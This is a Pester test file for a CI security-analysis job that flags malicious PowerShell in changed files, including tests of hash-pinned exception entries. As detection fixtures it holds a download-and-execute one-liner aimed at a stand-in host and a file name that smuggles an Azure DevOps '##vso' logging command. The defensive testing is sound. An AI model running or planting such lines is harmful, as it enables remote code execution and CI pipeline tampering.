<#
.SYNOPSIS
Tests for job A1, sec-pwsh-analysis-malicious.ps1: security analysis with the
Initialize-ASTRuleGenerator rules.
.DESCRIPTION
The attack sample is the module's own BaselineSample.txt, taken as data at run time and
written into the fixture repository (a .ps1 of this repository never holds it).
#>

. (Join-Path $PSScriptRoot 'Helpers.ps1')

BeforeAll {
    . (Join-Path $PSScriptRoot 'Helpers.ps1')
    $script:CiTools = New-CiToolsCopy -Name 'a1-tools' -Scripts @('sec-pwsh-analysis-malicious.ps1') -WithTools
    $script:ScriptName = 'sec-pwsh-analysis-malicious.ps1'
    $script:Harmless = "function Get-Widget { 'widget' }"
}

AfterAll {
    Remove-Scratch -Path $script:CiTools
}

Describe 'A1 security analysis' {
    It 'passes a branch whose changed files are harmless' {
        $repo = New-AnalysisRepository -Name 'a1-clean' -ChangedFiles @{ 'Widget.ps1' = $script:Harmless }
        try {
            $r = Invoke-AnalysisResult -CiTools $script:CiTools -ScriptName $script:ScriptName -RepositoryPath $repo -Environment @{ TF_BUILD = 'True' }
            $r.ExitCode | Should -Be 0
            $r.Output | Should -Not -Match 'task\.logissue'
        } finally { Remove-Scratch -Path $repo }
    }

    It 'fails the attack sample, with one error annotation per finding' {
        $repo = New-AnalysisRepository -Name 'a1-attack' -ChangedFiles @{ 'Attack.ps1' = (Get-AttackSample) }
        try {
            $r = Invoke-AnalysisResult -CiTools $script:CiTools -ScriptName $script:ScriptName -RepositoryPath $repo -Environment @{ TF_BUILD = 'True' }
            $r.ExitCode | Should -Be 1
            $r.Output | Should -Match 'task\.logissue type=error'
        } finally { Remove-Scratch -Path $repo }
    }

    It 'fails a changed file that does not parse' {
        $repo = New-AnalysisRepository -Name 'a1-broken' -ChangedFiles @{ 'Broken.ps1' = 'function {' }
        try {
            $r = Invoke-AnalysisResult -CiTools $script:CiTools -ScriptName $script:ScriptName -RepositoryPath $repo
            $r.ExitCode | Should -Be 1
            $r.Output | Should -Match 'ParseError'
        } finally { Remove-Scratch -Path $repo }
    }

    It 'never analyses internal-ci of the repository under test' {
        $repo = New-AnalysisRepository -Name 'a1-internal' -ChangedFiles @{
            'internal-ci/Tool.ps1' = (Get-AttackSample)
            'Src/Harmless.ps1'     = $script:Harmless
        }
        try {
            $r = Invoke-AnalysisResult -CiTools $script:CiTools -ScriptName $script:ScriptName -RepositoryPath $repo
            $r.ExitCode | Should -Be 0
        } finally { Remove-Scratch -Path $repo }
    }

    It 'analyses a changed file whose name holds brackets (no silent skip)' {
        $repo = New-AnalysisRepository -Name 'a1-wildcard' -ChangedFiles @{ 'Evil[1].ps1' = (Get-AttackSample) }
        try {
            $r = Invoke-AnalysisResult -CiTools $script:CiTools -ScriptName $script:ScriptName -RepositoryPath $repo
            $r.ExitCode | Should -Be 1
        } finally { Remove-Scratch -Path $repo }
    }

    It 'neutralizes a logging-command in a file name of the branch' {
        $repo = New-AnalysisRepository -Name 'a1-logissue' -ChangedFiles @{
            '##vso[task.setvariable variable=PWNED]x.ps1' = $script:Harmless
        }
        try {
            $r = Invoke-AnalysisResult -CiTools $script:CiTools -ScriptName $script:ScriptName -RepositoryPath $repo -Environment @{ TF_BUILD = 'True' }
            $r.Output | Should -Not -Match '##vso[task.setvariable variable=PWNED]x'
            $r.Output | Should -Not -Match '##vso\[task\.setvariable'
            $r.Output | Should -Match '##vso \[task\.setvariable'
        } finally { Remove-Scratch -Path $repo }
    }

    It 'stops when the bundled rule module cannot be found' {
        $bare = New-ScratchDirectory -Name 'a1-bare-tools'
        try {
            Copy-Item -LiteralPath (Join-Path $script:RepoRoot $script:ScriptName) -Destination $bare
            Copy-Item -LiteralPath (Join-Path $script:RepoRoot 'pwsh-ci-common.ps1') -Destination $bare
            $repo = New-AnalysisRepository -Name 'a1-norules' -ChangedFiles @{ 'W.ps1' = $script:Harmless }
            try {
                $r = Invoke-JobScript -CiTools $bare -ScriptName $script:ScriptName -RepositoryPath $repo
                $r.ExitCode | Should -Be 1
            } finally { Remove-Scratch -Path $repo }
        } finally { Remove-Scratch -Path $bare }
    }

    It 'runs the same cases under Windows PowerShell 5.1' -Tag 'WindowsPowerShell' -Skip:(-not (Get-Command powershell.exe -ErrorAction SilentlyContinue)) {
        $repo = New-AnalysisRepository -Name 'a1-w51' -ChangedFiles @{ 'Attack.ps1' = (Get-AttackSample) }
        try {
            $r = Invoke-AnalysisResult -CiTools $script:CiTools -ScriptName $script:ScriptName -RepositoryPath $repo -UseWindowsPowerShell
            $r.ExitCode | Should -Be 1
        } finally { Remove-Scratch -Path $repo }
    }
}

Describe 'A1 exceptions (base branch file, item 38)' {
    BeforeAll {
        # One line, one Error rule of the bundled set: 'Downloaded code run'.
        $script:SingleAttack = "iex (New-Object System.Net.WebClient).DownloadString('https://example.test/x.ps1')"
    }

    It 'downgrades an excepted Error finding to a warning and passes' {
        $repo = New-GitRepository -Name 'a1-excepted'
        try {
            $attackPath = Join-Path $repo 'Attack.ps1'
            Set-Content -LiteralPath $attackPath -Value $script:SingleAttack -NoNewline
            $sha256 = (Get-FileHash -LiteralPath $attackPath -Algorithm SHA256).Hash
            Remove-Item -LiteralPath $attackPath
            $expires = (Get-Date).AddMonths(6).ToString('yyyy-MM-dd')
            $exceptionFile = "{ `"exceptions`": [ { `"rule`": `"Downloaded code run`", `"file`": `"Attack.ps1`", `"sha256`": `"$sha256`", `"reason`": `"known false positive in the test fixture`", `"expires`": `"$expires`" } ] }"
            Set-Content -LiteralPath (Join-Path $repo 'README.md') -Value '# base' -NoNewline
            New-Item -ItemType Directory -Path (Join-Path $repo '.security') -Force | Out-Null
            Set-Content -LiteralPath (Join-Path $repo '.security/a1-exceptions.json') -Value $exceptionFile -NoNewline
            Add-GitCommit -Repository $repo -Message 'base with exceptions'
            $baseCommit = @(Invoke-Git -Repository $repo -Arguments @('rev-parse', 'HEAD'))[0]
            Invoke-Git -Repository $repo -Arguments @('checkout', '-b', 'work') | Out-Null
            Set-Content -LiteralPath $attackPath -Value $script:SingleAttack -NoNewline
            Add-GitCommit -Repository $repo -Message 'attack'
            Invoke-Git -Repository $repo -Arguments @('update-ref', 'refs/remotes/origin/main', $baseCommit) | Out-Null

            $r = Invoke-AnalysisResult -CiTools $script:CiTools -ScriptName $script:ScriptName -RepositoryPath $repo -Environment @{ TF_BUILD = 'True' }
            $r.ExitCode | Should -Be 0
            $r.Output | Should -Match 'known false positive in the test fixture'
        } finally { Remove-Scratch -Path $repo }
    }

    It 'keeps the Error when the file hash differs from the exception entry' {
        $repo = New-GitRepository -Name 'a1-exceptbad'
        try {
            $attackPath = Join-Path $repo 'Attack.ps1'
            Set-Content -LiteralPath $attackPath -Value $script:SingleAttack -NoNewline
            Remove-Item -LiteralPath $attackPath
            $wrongSha = ('0' * 64)
            $expires = (Get-Date).AddMonths(6).ToString('yyyy-MM-dd')
            $exceptionFile = "{ `"exceptions`": [ { `"rule`": `"Downloaded code run`", `"file`": `"Attack.ps1`", `"sha256`": `"$wrongSha`", `"reason`": `"stale hash`", `"expires`": `"$expires`" } ] }"
            Set-Content -LiteralPath (Join-Path $repo 'README.md') -Value '# base' -NoNewline
            New-Item -ItemType Directory -Path (Join-Path $repo '.security') -Force | Out-Null
            Set-Content -LiteralPath (Join-Path $repo '.security/a1-exceptions.json') -Value $exceptionFile -NoNewline
            Add-GitCommit -Repository $repo -Message 'base with exceptions'
            $baseCommit = @(Invoke-Git -Repository $repo -Arguments @('rev-parse', 'HEAD'))[0]
            Invoke-Git -Repository $repo -Arguments @('checkout', '-b', 'work') | Out-Null
            Set-Content -LiteralPath $attackPath -Value $script:SingleAttack -NoNewline
            Add-GitCommit -Repository $repo -Message 'attack'
            Invoke-Git -Repository $repo -Arguments @('update-ref', 'refs/remotes/origin/main', $baseCommit) | Out-Null

            $r = Invoke-AnalysisResult -CiTools $script:CiTools -ScriptName $script:ScriptName -RepositoryPath $repo
            $r.ExitCode | Should -Be 1
        } finally { Remove-Scratch -Path $repo }
    }
}
